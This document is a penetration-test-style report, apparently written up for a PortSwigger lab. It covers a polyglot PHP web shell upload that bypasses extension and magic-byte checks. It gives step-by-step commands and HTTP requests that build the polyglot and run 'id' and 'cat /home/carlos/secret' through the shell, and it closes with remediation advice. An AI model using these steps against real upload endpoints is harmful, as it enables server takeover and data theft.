# Vulnerability Report: Remote Code Execution via Polyglot Web Shell Upload

**Severity:** Critical  
**CVSS Score:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)  
**Date:** 2026-08-07  
**Target:** TARGET.web-security-academy.net

## Executive Summary
A Remote Code Execution vulnerability was identified in the avatar upload functionality of the application.
The upload filter validates both the filename extension and the file's magic bytes to ensure only image files are accepted.
However, by prepending valid image magic bytes to a PHP web shell — creating a polyglot file — both checks are satisfied simultaneously.
Uploading the file as `shell.php` causes the PHP engine to execute it when accessed directly via its static path,
while the magic byte check sees a valid image header and allows the upload through.
This was used to achieve full RCE: read arbitrary files, run OS commands, and exfiltrate sensitive data from the server.

## Vulnerability Details
| Field | Value |
|-------|-------|
| Type | Unrestricted File Upload via Polyglot Magic Byte Bypass |
| Endpoint | `POST /my-account/avatar` |
| Method | POST |
| Vulnerable Parameter | `filename` (multipart body) |
| Filter | Extension check + magic byte content validation |
| Bypass | Polyglot file — valid image magic bytes prepended to PHP web shell |
| Access Type | Direct static path — uploaded file is publicly accessible by URL |
| Privileges Required | Low (authenticated user account) |
| User Interaction | Not required |

## Steps to Reproduce
1. Log in to the application with a valid user account.
2. Navigate to the profile page and locate the avatar upload functionality.
3. Attempt to upload a plain PHP web shell — confirm the server returns "file is not a valid image."
4. Confirm extension bypass tricks (null byte, double extension, etc.) also fail — the filter validates content, not just the filename.
5. Take any small valid image file and append the PHP web shell to it:
```bash
cat original.png shell.php > polyglot.php
```
6. Upload `polyglot.php` — confirm the server accepts it (magic bytes at the start satisfy the content check; `.php` extension is accepted because the content passed).
7. Locate the static path to the uploaded file by inspecting the profile page HTML source.
8. Send a GET request to the file URL with an OS command in the `cmd` parameter:
```http
GET /files/avatars/polyglot.php?cmd=id HTTP/2
Host: TARGET.web-security-academy.net
```
9. Confirm OS command output is returned in the response body — RCE achieved.
10. Read the target file:
```http
GET /files/avatars/polyglot.php?cmd=cat+/home/carlos/secret HTTP/2
Host: TARGET.web-security-academy.net
```

## Proof of Concept
```http
POST /my-account/avatar HTTP/2
Host: TARGET.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="polyglot.php"
Content-Type: image/png

<PNG magic bytes><PHP web shell appended>
------WebKitFormBoundary--
```

Followed by:
```http
GET /files/avatars/polyglot.php?cmd=cat+/home/carlos/secret HTTP/2
Host: TARGET.web-security-academy.net
```

## Impact
An authenticated attacker can achieve full Remote Code Execution on the server by uploading a polyglot file through the avatar upload feature.
Both the extension check and the magic byte content validation are bypassed in a single upload.
Once the shell is uploaded and the static path is known, the attacker has unrestricted access to the OS environment.
This can lead to:
- Arbitrary file read — sensitive configs, credentials, private keys, user data
- Full OS command execution under the web server's process privileges
- Internal network reconnaissance from the server
- Reverse shell for persistent, interactive access
- Privilege escalation depending on server configuration
- Complete compromise of the host and any systems reachable from it

## Remediation
- Do not rely on magic bytes alone as a content validation strategy — they can be prepended to any file; use a library that validates the full file structure, not just the header
- Rename uploaded files server-side to a random UUID before storing — even if a `.php` file slips through, the attacker cannot reach it without knowing the path
- Serve uploaded files from a separate origin (S3, CDN, isolated domain) so the PHP execution context does not apply
- Disable script execution in upload directories at the server config level (e.g., `.htaccess` or Nginx config) as a last line of defense
- Validate that the file extension, `Content-Type` header, and actual file content all agree — reject any mismatch

## References
- OWASP: Unrestricted File Upload
- CWE-434: Unrestricted Upload of File with Dangerous Type
- PortSwigger: File upload vulnerabilities — remote code execution via polyglot web shell upload